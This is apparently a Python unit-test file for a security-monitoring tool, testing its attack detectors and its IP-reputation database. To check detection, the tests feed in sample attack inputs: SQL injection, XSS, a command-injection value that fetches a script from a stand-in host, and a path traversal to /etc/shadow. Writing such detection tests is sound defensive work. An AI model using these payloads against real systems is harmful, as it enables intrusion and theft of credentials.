#!/usr/bin/env python3
"""
PyFireSOC - Detection and database tests

Run with:  python -m unittest discover -v

These pin the behaviour that used to be broken, so the same bugs cannot come
back silently:
  * DetectionResult was truthy even when detected was False, so every
    `if result := detect_x(...)` branch was taken.
  * track_packet returned at the first detector, which meant detect_ddos was
    never reached at all.
  * update_ip_reputation ignored score_change when inserting a new IP.
"""

import os
import tempfile
import unittest

from detectors import AttackDetector, DetectionResult, no_detection
from database import Database


class TestDetectionResultTruthiness(unittest.TestCase):
    def test_negative_result_is_falsy(self):
        self.assertFalse(bool(no_detection()))

    def test_positive_result_is_truthy(self):
        result = DetectionResult(detected=True, category="xss", severity="high",
                                 description="", payload="")
        self.assertTrue(bool(result))

    def test_clean_payload_reports_nothing(self):
        detector = AttackDetector()
        self.assertFalse(detector.detect_sql_injection("hello world"))
        self.assertFalse(detector.detect_xss("hello world"))
        self.assertFalse(detector.detect_command_injection("hello world"))
        self.assertFalse(detector.detect_path_traversal("hello world"))


class TestPayloadSignatures(unittest.TestCase):
    def setUp(self):
        self.detector = AttackDetector()

    def categories(self, payload):
        return {r.category for r in self.detector.inspect_payload(payload, "1.2.3.4", 80)}

    def test_sql_injection(self):
        self.assertIn("sql_injection", self.categories("GET /?id=1' OR '1'='1"))
        self.assertIn("sql_injection", self.categories("/?q=1 UNION SELECT password FROM users"))

    def test_xss(self):
        self.assertIn("xss", self.categories("/?q=<script>alert(1)</script>"))
        self.assertIn("xss", self.categories('/?q=<img src=x onerror=alert(1)>'))

    def test_command_injection(self):
        self.assertIn("command_injection", self.categories("/?host=1.1.1.1;whoami"))
        self.assertIn("command_injection", self.categories("/?f=$(curl http://evil.test/s.sh)"))

    def test_path_traversal(self):
        self.assertIn("path_traversal", self.categories("/?file=../../../etc/shadow"))
        self.assertIn("path_traversal", self.categories("/?file=%2e%2e%2f%2e%2e%2fboot"))

    def test_ordinary_traffic_is_not_flagged(self):
        """Regression: these all matched before the signatures were tightened"""
        benign = [
            "GET /app?version=2 HTTP/1.1",
            "GET /blog/why-shipping-fast-matters HTTP/1.1",
            'POST /api/notes {"body": "remember to ping the team"}',
            "GET /docs/search?q=how+to+UPDATE+a+record HTTP/1.1",
            'POST /api/items {"action": "insert into cart"}',
            "GET /?reason=expired&season=winter HTTP/1.1",
        ]
        for payload in benign:
            self.assertEqual(set(), self.categories(payload), f"false positive on {payload!r}")


class TestBehaviouralDetection(unittest.TestCase):
    def test_port_scan(self):
        detector = AttackDetector()
        detected = [detector.track_packet("10.0.0.1", port) for port in range(20, 40)]
        self.assertTrue(any(r and r.category == "port_scan" for r in detected))

    def test_ddos_is_reachable(self):
        """Regression: track_packet returned early, so detect_ddos never ran"""
        detector = AttackDetector()
        categories = set()
        for _ in range(detector.DDOS_THRESHOLD * 2):
            if result := detector.track_packet("10.0.0.2", 443):
                categories.add(result.category)
        self.assertIn("ddos", categories)

    def test_syn_flood(self):
        detector = AttackDetector()
        categories = set()
        for _ in range(detector.SYN_FLOOD_THRESHOLD * 2):
            if result := detector.track_packet("10.0.0.3", 80, is_syn=True):
                categories.add(result.category)
        self.assertIn("syn_flood", categories)

    def test_brute_force(self):
        detector = AttackDetector()
        results = [detector.track_failure("10.0.0.4")
                   for _ in range(detector.BRUTE_FORCE_THRESHOLD + 1)]
        self.assertTrue(any(r and r.category == "brute_force" for r in results))

    def test_single_packet_is_quiet(self):
        detector = AttackDetector()
        self.assertFalse(detector.track_packet("10.0.0.5", 443))

    def test_most_severe_detection_wins(self):
        detector = AttackDetector()
        severities = set()
        for port in range(1000, 1000 + detector.DDOS_THRESHOLD * 2):
            if result := detector.track_packet("10.0.0.6", port, is_syn=True):
                severities.add(result.severity)
        # port_scan is medium; syn_flood and ddos are critical
        self.assertIn("critical", severities)

    def test_block_expires(self):
        detector = AttackDetector()
        detector.block_ip("10.0.0.7", duration=0)
        self.assertFalse(detector.is_blocked("10.0.0.7"))

    def test_block_holds(self):
        detector = AttackDetector()
        detector.block_ip("10.0.0.8", duration=60)
        self.assertTrue(detector.is_blocked("10.0.0.8"))


class TestDatabase(unittest.TestCase):
    def setUp(self):
        handle, self.path = tempfile.mkstemp(suffix=".db")
        os.close(handle)
        self.db = Database(self.path)

    def tearDown(self):
        self.db.close()
        for suffix in ("", "-wal", "-shm"):
            try:
                os.remove(self.path + suffix)
            except OSError:
                pass

    def test_first_offence_costs_score(self):
        """Regression: the INSERT branch hardcoded score 0"""
        self.db.update_ip_reputation("203.0.113.9", score_change=10, category="malicious")
        reputation = self.db.get_ip_reputation("203.0.113.9")
        self.assertEqual(10, reputation['score'])
        self.assertEqual("malicious", reputation['category'])
        self.assertEqual(1, reputation['alert_count'])

    def test_score_accumulates_and_clamps(self):
        for _ in range(15):
            self.db.update_ip_reputation("203.0.113.10", score_change=10)
        self.assertEqual(100, self.db.get_ip_reputation("203.0.113.10")['score'])

    def test_score_never_goes_negative(self):
        self.db.update_ip_reputation("203.0.113.11", score_change=-1)
        self.assertEqual(0, self.db.get_ip_reputation("203.0.113.11")['score'])

    def test_batch_insert(self):
        events = [{
            'timestamp': '2026-01-01T00:00:00',
            'event_type': 'connection',
            'src_ip': f'198.51.100.{n}',
            'dst_ip': '10.0.0.1',
            'dst_port': 80,
            'protocol': 'TCP',
            'payload': '',
            'action_taken': 'permit',
        } for n in range(50)]
        self.assertEqual(50, self.db.log_events_batch(events))
        self.assertEqual(50, self.db.get_stats()['total_events'])

    def test_batch_insert_of_nothing(self):
        self.assertEqual(0, self.db.log_events_batch([]))

    def test_decay_reputation(self):
        self.db.update_ip_reputation("198.51.100.200", score_change=10)
        self.db.decay_reputation(["198.51.100.200"])
        self.assertEqual(9, self.db.get_ip_reputation("198.51.100.200")['score'])

    def test_indexes_exist(self):
        conn = self.db.get_connection()
        names = {row[0] for row in conn.execute(
            "SELECT name FROM sqlite_master WHERE type='index'")}
        self.assertIn("idx_events_timestamp", names)
        self.assertIn("idx_events_type_ts", names)


if __name__ == "__main__":
    unittest.main()
